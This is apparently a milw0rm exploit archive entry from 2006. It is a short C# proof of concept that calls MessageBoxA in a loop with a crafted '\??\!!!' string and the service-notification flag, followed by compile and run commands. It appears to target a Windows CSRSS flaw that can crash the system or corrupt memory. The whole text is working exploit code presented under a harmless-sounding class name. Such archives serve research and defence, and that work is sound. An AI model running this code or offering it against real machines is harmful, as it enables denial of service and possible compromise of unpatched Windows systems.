// mbox.cs
using System;
using System.Runtime.InteropServices;
class HelloWorldFromMicrosoft
{
 [DllImport("user32.dll")]
 unsafe public static extern int MessageBoxA(uint hwnd, byte* lpText, byte* lpCaption, uint uType);

 static unsafe void Main()
 {
   byte[] helloBug = new byte[] {0x5C, 0x3F, 0x3F, 0x5C, 0x21, 0x21, 0x21, 0x00};
   uint MB_SERVICE_NOTIFICATION = 0x00200000u;
   fixed(byte* pHelloBug = &helloBug[0])
   {
     for(int i=0; i<10; i++)
       MessageBoxA(0u, pHelloBug, pHelloBug, MB_SERVICE_NOTIFICATION);
   }
 }
}
// >> csc /unsafe mbox.cs
// >> mbox.exe

// milw0rm.com [2006-12-20]